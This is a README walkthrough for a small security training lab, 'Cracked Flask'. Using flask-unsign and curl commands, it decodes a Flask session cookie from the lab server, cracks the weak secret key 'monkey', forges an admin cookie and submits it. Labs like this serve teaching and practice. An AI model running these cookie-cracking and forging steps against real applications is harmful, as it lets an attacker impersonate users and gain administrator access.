# Cracked Flask

A very simple lab for cracking Flask session cookies.


## Walk Through

Pull down the cookie and have a look what is in it:

```
flask-unsign --decode --server https://crackedflask.digi.ninja
```

Try to crack it:

```
flask-unsign --unsign --server https://crackedflask.digi.ninja
```

Cracked it and got the secret key "monkey" so now create a new cookie with the username admin rather than robin:

```
flask-unsign --sign --secret monkey --cookie "{'hello': 'world2', 'username': 'admin'}"
```

Finally, make a request using the new cookie:

```
curl --cookie "session=eyJoZWxsbyI6IndvcmxkMiIsInVzZXJuYW1lIjoiYWRtaW4ifQ.YbCXpA.45th8HQUFJO6GHycU_fMkPQ31qc" https://crackedflask.digi.ninja
```

If you want to combine the last two commands:

```
COOKIE=`flask-unsign --sign --secret monkey --cookie "{'hello': 'world2', 'username': 'admin'}"`
curl --cookie "session=$COOKIE" https://crackedflask.digi.ninja
```

Or you could just put the signing command into the curl command with backticks.

## References

Some useful references:

- [Flask Unsign](https://github.com/Paradoxis/Flask-Unsign) - A tool to decode, crack, and sign, Flask cookies.
- [Building a Flask app](https://flask.palletsprojects.com/en/2.0.x/quickstart/) - Building your first Flask app.
- [Deploying a Flask app](https://flask.palletsprojects.com/en/2.0.x/tutorial/deploy/) - How to deploy a Flask app.
- [Building and deploying a Flask app in Docker](https://support.stackpath.com/hc/en-us/articles/360022987711-Edge-Computing-Building-a-Containerized-Python-Web-App-Using-Flask) - A full walk through of all the stages in a single page.
